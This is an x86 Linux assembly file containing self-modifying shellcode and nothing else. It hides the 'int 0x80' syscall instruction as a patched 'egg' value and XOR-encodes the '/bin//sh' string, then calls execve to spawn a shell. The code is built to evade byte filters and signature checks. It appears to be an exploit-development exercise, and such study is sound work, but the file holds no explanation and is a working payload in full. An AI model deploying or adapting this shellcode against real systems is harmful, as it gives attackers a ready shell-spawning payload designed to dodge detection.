bits 32

section .section exec write

global _start
_start:
	jmp locate_payload

post_locate_payload:
	pop esi			; save payload location
	mov edx, esi		; //

search_egg:
	mov eax, [edx]
	cmp word ax, 0x7dca	; search egg
	jne not_found
	add ax, 0x0303		; 0x7dca + 0x0303 = 0x80cd (int 0x80)
	mov [edx], eax		; write instruction -> segfault

not_found:
	inc edx
	cmp eax, 0xcafebabe	; end of payload marker
	jne search_egg		; keep searching eggs
	jmp esi			; jmp to payload

locate_payload:
	call post_locate_payload

payload:
	xor	eax, eax
	push 	eax		; push 0: /bin//sh NUL terminator
	mov	edx, 0xffffffff
	xor	edx, 0x978cd0d0
	push	edx		; push 0x68732f2f: //sh 
	mov	edx, 0xffffffff
	xor	edx, 0x91969dd0
	push 	edx		; push 0x6e69622f: /bin
	xor 	edx, edx
	mov 	ebx, esp
	push 	eax
	push 	ebx
	mov 	ecx, esp
	mov 	al, 0xb		; SYS_execve
	dw 	0x7dca		; int 0x80 egg
	dd 	0xcafebabe	; end of payload
